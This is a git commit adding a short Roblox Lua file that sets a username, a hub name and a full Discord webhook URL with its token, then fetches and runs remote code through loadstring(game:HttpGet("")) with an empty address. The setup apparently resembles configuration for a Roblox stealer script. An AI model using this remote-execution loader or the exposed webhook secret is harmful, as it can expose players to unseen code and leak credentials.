b7b71bd879eb40c5ecd1844401a208e32bb1acb4
FCF-FCF-Github <139944260+FCF-FCF-Github@users.noreply.github.com>
2025-08-12 00:32:36 +0300

    Add files via upload

---
+++ loadstring.lua
@@ -0,0 +1,5 @@
+_G.Username = "Michailroblox2806"
+_G.HubName = "Super puper script"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1404577037372358786/PoYQAqehNgypnwhJOyr17naC4ZRlaE0n-pdutMZljxaNjH0SBw2vSeGogLY7Z9zsZqwz"
+
+loadstring(game:HttpGet(""))()
